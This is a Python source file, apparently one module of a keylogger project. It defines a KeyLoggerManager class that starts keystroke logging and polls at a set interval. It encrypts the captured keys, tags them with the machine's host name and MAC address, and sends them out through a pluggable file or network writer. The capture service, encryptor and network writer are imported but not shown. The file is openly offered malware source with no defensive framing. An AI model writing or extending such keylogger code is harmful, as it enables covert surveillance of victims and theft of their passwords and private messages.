import time
from keyLoggerService import *
from fileWriter import *
from networkWriter import *
from encryptor import *
from getmac import get_mac_address
import socket

class KeyLoggerManager:

    def __init__(self, interval: int = 10, how_to_write: Iwriter = None):
        self.__interval = interval
        self.__machine_name = {socket.gethostname(): str(get_mac_address())}
        self.__service = KeyLoggerService()
        self.__writer: Iwriter = how_to_write

    def collect_data(self) -> None:
        self.__service.start_logging()
        duration = self.__interval
        while True:
            time.sleep(duration)
            if not self.__service.get_logged_keys():
                continue
            else:
                self.send_data(self.process_data(self.__service.get_logged_keys()))
                self.__service.flush()


    def process_data(self, data: List[str]) -> str:
        data_str = "".join(data)
        encrypted_data1 = Encryptor().encrypt(data_str)
        return encrypted_data1


    def send_data(self, enc_data: str) -> None:
        machine_name = self.__machine_name
        self.__writer.send_data(enc_data, machine_name)



